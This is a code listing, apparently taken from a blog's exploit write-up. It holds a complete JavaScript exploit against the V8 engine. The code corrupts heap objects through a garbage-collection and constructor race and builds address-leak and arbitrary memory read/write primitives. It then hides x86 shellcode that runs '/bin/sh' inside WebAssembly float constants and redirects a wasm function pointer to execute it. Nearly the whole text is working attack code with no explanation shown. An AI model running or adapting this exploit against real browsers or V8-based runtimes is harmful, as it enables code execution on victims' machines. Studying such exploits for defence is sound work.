class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> empty_object = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> empty_array = [];</span><br><span class="line"><span class="keyword">let</span> corrupted_instance = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> dogc_flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> b64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line"><span class="keyword">let</span> system_flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">dogc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (dogc_flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">900</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassParent</span> &#123; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassBug</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ClassParent</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">a20, a21, a22</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> v24 = <span class="keyword">new</span> <span class="keyword">new</span>.<span class="title function_">target</span>();</span><br><span class="line">        <span class="keyword">let</span> x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="keyword">let</span> a = [<span class="number">1.1</span>];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">a</span> = a;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(empty_array);</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="number">1</span>] = <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">dogc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">650</span>; i++) &#123;</span><br><span class="line">    dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">644</span> || i == <span class="number">645</span> || i == <span class="number">646</span> || i == <span class="number">640</span>) &#123;</span><br><span class="line">        dogc_flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">dogc</span>();</span><br><span class="line">        dogc_flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) dogc_flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="title class_">Reflect</span>.<span class="title function_">construct</span>(<span class="title class_">ClassBug</span>, empty_array, <span class="title class_">ClassParent</span>);</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">646</span>) &#123;</span><br><span class="line">        corrupted_instance = x;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// %DebugPrint(corrupted_instance.a);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = corrupted_instance.<span class="property">x</span>;</span><br><span class="line"><span class="keyword">let</span> a = corrupted_instance.<span class="property">a</span>;</span><br><span class="line"><span class="keyword">let</span> rwarr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line">dogc_flag = <span class="literal">true</span>;</span><br><span class="line"><span class="title function_">dogc</span>();</span><br><span class="line">x[<span class="number">5</span>] = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof_tmp</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    x[<span class="number">0</span>] = obj;</span><br><span class="line">    f64[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> u32[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> addr_a = <span class="title function_">addrof_tmp</span>(a);</span><br><span class="line"><span class="keyword">let</span> addr_rwarr = <span class="title function_">addrof_tmp</span>(rwarr);</span><br><span class="line"><span class="keyword">let</span> offset = (addr_rwarr - addr_a) + <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">if</span> ((offset % <span class="number">8</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    offset += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">offset = offset / <span class="number">8</span>;</span><br><span class="line">offset += <span class="number">1</span>;</span><br><span class="line">offset -= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> mark  = offset;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(rwarr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mark is ==&gt; &quot;</span> , mark);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a [mark] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[mark]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a[2] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[<span class="number">2</span>]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">where, what</span>) &#123;</span><br><span class="line">    b64[<span class="number">0</span>] = <span class="number">0n</span>;</span><br><span class="line">    f64[<span class="number">0</span>] = a[mark];</span><br><span class="line">    <span class="keyword">if</span> (u32[<span class="number">0</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">1</span>] = where - <span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (u32[<span class="number">1</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">0</span>] = where-<span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">      rwarr[<span class="number">0</span>] = what;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> changer = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> leaker  = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> holder  = &#123;<span class="attr">p1</span>:<span class="number">0x1</span>, <span class="attr">p2</span>: <span class="number">0x1</span>, <span class="attr">p3</span>:<span class="number">0x1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> changer_addr = <span class="title function_">addrof_tmp</span>(changer);</span><br><span class="line"><span class="keyword">let</span> leaker_addr = <span class="title function_">addrof_tmp</span>(leaker);</span><br><span class="line"><span class="keyword">let</span> holder_addr = <span class="title function_">addrof_tmp</span>(holder);</span><br><span class="line">u32[<span class="number">0</span>] = holder_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">let</span> holder_addr_64 = f64[<span class="number">0</span>];</span><br><span class="line">u32[<span class="number">0</span>] = leaker_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(changer_addr + <span class="number">0x8</span>, f64[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// %DebugPrint(changer);</span></span><br><span class="line"><span class="title function_">write</span>(leaker_addr + <span class="number">0x8</span>, holder_addr_64);</span><br><span class="line"><span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">x.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">a.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">rwarr.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>) &#123;</span><br><span class="line">    f64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">BigInt</span>(u32[<span class="number">0</span>]) + (<span class="title class_">BigInt</span>(u32[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_read64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    f64[<span class="number">0</span>] = leaker[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(value);</span><br><span class="line">    leaker[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    holder.<span class="property">p2</span> = obj;</span><br><span class="line">    <span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">    <span class="comment">// %DebugPrint(holder);</span></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">1</span>];</span><br><span class="line">    holder.<span class="property">p2</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> buffer_2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">let</span> f64_2 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer_2);</span><br><span class="line"><span class="keyword">let</span> u32_2 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buffer_2);</span><br><span class="line"><span class="keyword">let</span> b64_2 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer_2);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">wasm_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32_2[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32_2[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64_2[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    b64_2[<span class="number">0</span>] = value;</span><br><span class="line">    leaker[<span class="number">0</span>] = f64_2[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// var data_buf = new ArrayBuffer(0x10);</span></span><br><span class="line"><span class="comment">// var data_view = new DataView(data_buf);</span></span><br><span class="line"><span class="comment">// data_view.setFloat64(0, 2.0, true);</span></span><br><span class="line"><span class="comment">// %DebugPrint(data_buf);</span></span><br><span class="line"><span class="comment">// %DebugPrint(data_view);</span></span><br><span class="line"><span class="comment">// while (1) &#123;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">shell_func</span>();</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(shell_func);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_rwx_addr = <span class="title function_">v8h_read64</span>(shell_wasm_instance_addr + <span class="number">0x48n</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_func_code_addr = shell_wasm_rwx_addr + <span class="number">0xB40n</span>;</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = shell_func_code_addr + <span class="number">0x2Dn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(shell_func_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(shell_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">%<span class="title class_">DebugPrint</span>(shell_wasm_instance);</span><br><span class="line"><span class="comment">// while (1) &#123;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line"><span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">96</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">1</span>,<span class="number">124</span>,<span class="number">96</span>,<span class="number">2</span>,<span class="number">124</span>,<span class="number">124</span>,<span class="number">0</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">125</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">36</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">13</span>,<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">117</span>,</span><br><span class="line"><span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">106</span>,<span class="number">115</span>,<span class="number">3</span>,<span class="number">116</span>,<span class="number">98</span>,<span class="number">108</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">3</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">7</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">114</span>,<span class="number">97</span>,<span class="number">121</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line"><span class="number">10</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">22</span>,<span class="number">0</span>,<span class="number">68</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">144</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">16</span>,<span class="number">195</span>,<span class="number">68</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,<span class="number">204</span>,</span><br><span class="line"><span class="number">233</span>,<span class="number">67</span>,<span class="number">26</span>,<span class="number">26</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">32</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">11</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tbl = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Table</span>(&#123;</span><br><span class="line">    <span class="attr">initial</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">element</span>: <span class="string">&quot;anyfunc&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> importObject = &#123;</span><br><span class="line">    <span class="attr">imports</span>: &#123; imported_func : <span class="function">(<span class="params">n</span>) =&gt;</span> n + <span class="number">1</span>, &#125;,</span><br><span class="line">    <span class="attr">js</span>: &#123; tbl &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, importObject);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmInstance_addr = <span class="title function_">addrof</span>(wasmInstance);</span><br><span class="line"><span class="keyword">let</span> RWX_page_pointer = <span class="title function_">v8h_read64</span>(wasmInstance_addr+<span class="number">0x48n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_make_array = wasmInstance.<span class="property">exports</span>.<span class="property">make_array</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> func_main = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="title function_">wasm_write</span>(wasmInstance_addr+<span class="number">0x48n</span>, shell_code_addr);</span><br><span class="line"><span class="title function_">func_main</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
